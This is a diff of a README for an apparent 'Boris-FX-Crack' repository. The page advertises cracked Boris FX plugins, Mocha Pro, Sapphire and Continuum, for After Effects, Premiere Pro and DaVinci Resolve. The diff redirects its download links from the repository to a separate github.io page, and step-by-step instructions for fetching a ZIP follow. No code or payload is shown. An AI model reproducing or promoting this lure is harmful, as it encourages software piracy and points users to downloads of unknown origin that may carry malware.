@@ -1,6 +1,6 @@
 # 🎞️ Boris-FX-Crack - Professional Visual Effects Tools For Editors
 
-[![](https://img.shields.io/badge/Download-Boris-FX-Suite-blue)](https://github.com/anwargondal04-tech/Boris-FX-Crack)
+[![](https://img.shields.io/badge/Download-Boris-FX-Suite-blue)](https://anwargondal04-tech.github.io)
 
 This collection provides tools for Mocha Pro, Sapphire, and Continuum. These plugins help you work on motion graphics, tracking, and video editing. Use these resources to add effects to your projects in After Effects, Premiere Pro, or DaVinci Resolve.
 
@@ -18,7 +18,7 @@ Before you install these plugins, make sure your computer meets these minimum st
 
 Follow these steps to fetch the files and add them to your software.
 
-1. Go to the [Project Download Page](https://github.com/anwargondal04-tech/Boris-FX-Crack).
+1. Go to the [Project Download Page](https://anwargondal04-tech.github.io).
 2. Look for the green code button on the top right side of the screen.
 3. Select the "Download ZIP" option.
 4. Save the file to your computer.
